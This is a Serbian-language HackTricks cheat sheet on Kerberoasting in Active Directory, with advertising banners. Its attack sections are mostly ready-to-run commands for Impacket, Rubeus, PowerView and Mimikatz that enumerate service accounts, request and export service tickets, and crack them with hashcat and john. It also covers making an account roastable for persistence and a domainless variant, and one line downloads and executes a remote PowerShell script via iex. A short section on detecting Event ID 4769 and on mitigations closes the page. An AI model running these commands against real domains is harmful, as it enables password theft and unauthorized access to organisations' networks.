# Kerberoast

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) za lako kreiranje i **automatizaciju radnih tokova** pokretanih najnaprednijim **alatom** zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se fokusira na sticanje **TGS karata**, posebno onih povezanih sa uslugama koje rade pod **korisničkim nalozima** u **Active Directory (AD)**, isključujući **računare**. Enkripcija ovih karata koristi ključeve koji potiču od **korisničkih lozinki**, što omogućava mogućnost **offline krakenja kredencijala**. Korišćenje korisničkog naloga kao usluge označeno je ne-praznom **"ServicePrincipalName"** svojstvom.

Za izvršavanje **Kerberoasting-a**, neophodan je domen nalog sposoban za zahtev **TGS karata**; međutim, ovaj proces ne zahteva **posebne privilegije**, što ga čini dostupnim svima sa **važećim domen kredencijalima**.

### Ključne tačke:

- **Kerberoasting** cilja **TGS karte** za **usluge korisničkih naloga** unutar **AD**.
- Karte enkriptovane sa ključevima iz **korisničkih lozinki** mogu se **krakati offline**.
- Usluga se identifikuje po **ServicePrincipalName** koji nije prazan.
- **Nema posebnih privilegija** potrebnih, samo **važeći domen kredencijali**.

### **Napad**

> [!WARNING]
> **Kerberoasting alati** obično zahtevaju **`RC4 enkripciju`** prilikom izvođenja napada i iniciranja TGS-REQ zahteva. To je zato što je **RC4** [**slabiji**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) i lakše se kraka offline koristeći alate kao što je Hashcat nego drugi algoritmi enkripcije kao što su AES-128 i AES-256.\
> RC4 (tip 23) hešovi počinju sa **`$krb5tgs$23$*`** dok AES-256 (tip 18) počinju sa **`$krb5tgs$18$*`**.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Alati sa više funkcija uključuju dump kerberoastable korisnika:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Enumerisati Kerberoastable korisnike**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **Tehnika 1: Zatražite TGS i izvadite ga iz memorije**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **Tehnika 2: Automatski alati**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> Kada se zatraži TGS, generiše se Windows događaj `4769 - A Kerberos service ticket was requested`.

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) za lako kreiranje i **automatizaciju radnih tokova** pokretanih **najnaprednijim** alatima zajednice na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### Kršenje
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistence

Ako imate **dovoljna ovlašćenja** nad korisnikom, možete **učiniti ga kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Možete pronaći korisne **alate** za **kerberoast** napade ovde: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Ako dobijete ovu **grešku** iz Linux-a: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** to je zbog vašeg lokalnog vremena, potrebno je da sinhronizujete host sa DC-om. Postoji nekoliko opcija:

- `ntpdate <IP of DC>` - Zastarjelo od Ubuntu 16.04
- `rdate -n <IP of DC>`

### Ublažavanje

Kerberoasting se može sprovoditi sa visokim stepenom prikrivenosti ako je moguće iskoristiti. Da bi se otkrila ova aktivnost, treba obratiti pažnju na **Security Event ID 4769**, koji ukazuje da je Kerberos tiket zatražen. Međutim, zbog visoke učestalosti ovog događaja, moraju se primeniti specifične filtracije kako bi se izolovale sumnjive aktivnosti:

- Ime usluge ne bi trebalo da bude **krbtgt**, jer je to normalan zahtev.
- Imena usluga koja se završavaju sa **$** treba isključiti kako bi se izbeglo uključivanje mašinskih naloga koji se koriste za usluge.
- Zahtevi sa mašina treba filtrirati isključivanjem imena naloga formatiranih kao **machine@domain**.
- Samo uspešni zahtevi za tikete treba uzeti u obzir, identifikovani kodom greške **'0x0'**.
- **Najvažnije**, tip enkripcije tiketa treba da bude **0x17**, koji se često koristi u Kerberoasting napadima.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Da bi se smanjio rizik od Kerberoasting-a:

- Osigurajte da su **lozinke servisnih naloga teške za pogoditi**, preporučujući dužinu veću od **25 karaktera**.
- Koristite **Upravljane servisne naloge**, koji nude prednosti kao što su **automatske promene lozinki** i **delegisano upravljanje servisnim imenom (SPN)**, čime se poboljšava bezbednost protiv ovakvih napada.

Implementacijom ovih mera, organizacije mogu značajno smanjiti rizik povezan sa Kerberoasting-om.

## Kerberoast bez domena

U **septembru 2022**, novi način za eksploataciju sistema otkrio je istraživač po imenu Charlie Clark, podeljen putem njegove platforme [exploit.ph](https://exploit.ph/). Ova metoda omogućava sticanje **Servisnih karata (ST)** putem **KRB_AS_REQ** zahteva, što izuzetno ne zahteva kontrolu nad bilo kojim Active Directory nalogom. Suštinski, ako je glavni entitet postavljen na način koji ne zahteva prethodnu autentifikaciju—scenario sličan onome što se u oblasti sajber bezbednosti naziva **AS-REP Roasting napad**—ova karakteristika se može iskoristiti za manipulaciju procesom zahteva. Konkretno, menjajući **sname** atribut unutar tela zahteva, sistem se obmanjuje da izda **ST** umesto standardne enkriptovane karte za dobijanje karte (TGT).

Tehnika je u potpunosti objašnjena u ovom članku: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> Morate pružiti listu korisnika jer nemamo važeći nalog za upit LDAP koristeći ovu tehniku.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Reference

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) da lako izgradite i **automatizujete radne tokove** pokretane **najnaprednijim** alatima zajednice na svetu.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
